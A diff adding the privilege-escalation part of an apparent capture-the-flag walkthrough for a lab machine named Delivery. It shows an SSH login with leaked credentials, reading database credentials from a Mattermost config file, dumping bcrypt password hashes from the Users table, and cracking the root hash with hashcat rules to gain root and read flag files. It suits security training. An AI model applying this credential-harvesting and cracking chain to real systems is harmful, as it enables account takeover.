@@ -31,3 +31,109 @@ And here on a channel called internal we see:
 @developers Please update theme to the OSTicket before we go live.  Credentials to the server are maildeliverer:Youve_G0t_Mail!
 
 Also please create a program to help us stop re-using the same passwords everywhere.... Especially those that are a variant of "PleaseSubscribe!"
+
+====User flags=======
+ssh maildeliverer@10.10.10.222 : Youve_G0t_Mail!
+maildeliverer@Delivery:~$ cat user.txt 
+0e4ed7d7443ed11d22b74223936d9df1
+
+======Priv Escalation================
+maildeliverer@Delivery:/opt/mattermost/config$ cat config.json
+"SqlSettings": {
+        "DriverName": "mysql",
+        "DataSource": "mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s",
+        "AtRestEncryptKey": "n5uax3d4f919obtsp1pw1k5xetq1enez",
+        
+maildeliverer@Delivery:/opt/mattermost/config$ mysql -u mmuser -D mattermost -p
+Enter password: Crack_The_MM_Admin_PW
+
+MariaDB [mattermost]> show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mattermost         |
++--------------------+
+2 rows in set (0.000 sec)
+
+MariaDB [mattermost]> use mattermost;
+Database changed
+MariaDB [mattermost]> show tables;
++------------------------+
+| Tables_in_mattermost   |
++------------------------+
+| Audits                 |
+| ChannelMembers         |
+| Channels               |
+
+| Users                  |
++------------------------+
+46 rows in set (0.001 sec)
+
+MariaDB [mattermost]> describe Users;
++--------------------+--------------+------+-----+---------+-------+
+| Field              | Type         | Null | Key | Default | Extra |
++--------------------+--------------+------+-----+---------+-------+
+| Id                 | varchar(26)  | NO   | PRI | NULL    |       |
+| Username           | varchar(64)  | YES  | UNI | NULL    |       |
+| Password           | varchar(128) | YES  |     | NULL    |       |
+| Email              | varchar(128) | YES  | UNI | NULL    |       |
+| EmailVerified      | tinyint(1)   | YES  |     | NULL    |       |
+| Nickname           | varchar(64)  | YES  |     | NULL    |       |
+| FirstName          | varchar(64)  | YES  |     | NULL    |       |
+| LastName           | varchar(64)  | YES  |     | NULL    |       |
+| Position           | varchar(128) | YES  |     | NULL    |       |
+| Roles              | text         | YES  |     | NULL    |       |
+|
++--------------------+--------------+------+-----+---------+-------+
+25 rows in set (0.001 sec)
+
+MariaDB [mattermost]> select Username, Password, Email, Firstname from Users;
++----------------------------------+--------------------------------------------------------------+-------------------------+--------------------+
+| Username                         | Password                                                     | Email                   | Firstname          |
++----------------------------------+--------------------------------------------------------------+-------------------------+--------------------+
+| surveybot                        |                                                              | surveybot@localhost     | Surveybot          |
+| c3ecacacc7b94f909d04dbfd308a9b93 | $2a$10$u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK | 4120849@delivery.htb    |                    |
+| 5b785171bfb34762a933e127630c4860 | $2a$10$3m0quqyvCE8Z/R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS/G | 7466068@delivery.htb    |                    |
+| marto                            | $2a$10$Ggw.hRRh8VGD.1nwzcWVtOOWPmjbY3jq.higAiDtcAUfS0QZQ94TG | 6855489@delivery.htb    |                    |
+| root                             | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO | root@delivery.htb       |                    |
+| ff0a21fc6fc2488195e16ea854c963ee | $2a$10$RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq | 9122359@delivery.htb    |                    |
+| channelexport                    |                                                              | channelexport@localhost | Channel Export Bot |
+| 9ecfb4be145d47fda0724f697f35ffaf | $2a$10$s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm | 5056505@delivery.htb    |                    |
+| test                             | $2a$10$p0d7y41HTO2m3nxy6fmVuuwxFo3DZfVtwQzDqp4hz9N43cExt5oE2 | 5778775@delivery.htb    |                    |
++----------------------------------+--------------------------------------------------------------+-------------------------+--------------------+
+9 rows in set (0.001 sec)
+
+Now I can try to identify and crack the root hash.
+| root                             | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO | root@delivery.htb       | 
+
+└─# hashid hash.txt 
+--File 'hash.txt'--
+Analyzing '$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO'
+[+] Blowfish(OpenBSD) 
+[+] Woltlab Burning Board 4.x 
+[+] bcrypt
+
+└─# hashcat --help
+- [ Basic Examples ] -
+
+  Attack-          | Hash- |
+  Mode             | Type  | Example command
+ ==================+=======+==================================================================
+  Wordlist         | $P$   | hashcat -a 0 -m 400 example400.hash example.dict
+  Wordlist + Rules | MD5   | hashcat -a 0 -m 0 example0.hash example.dict -r rules/best64.rule
+  Brute-Force      | MD5   | hashcat -a 3 -m 0 example0.hash ?a?a?a?a?a?a
+  Combinator       | MD5   | hashcat -a 1 -m 0 example0.hash example.dict example.dict
+
+Searching the net for bcrypt mode, we realize it is 3200.
+└─# hashcat -a 0 -m 3200 hash.txt -r /usr/share/hashcat/rules/best64.rule
+PleaseSubscribe!21
+maildeliverer@Delivery:/opt/mattermost/config$ su - root
+Password: 
+root@Delivery:~# whoami
+root
+root@Delivery:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@Delivery:~# cat /root/root.txt
+2797566d5efdc2359d857f61e698867f
+   
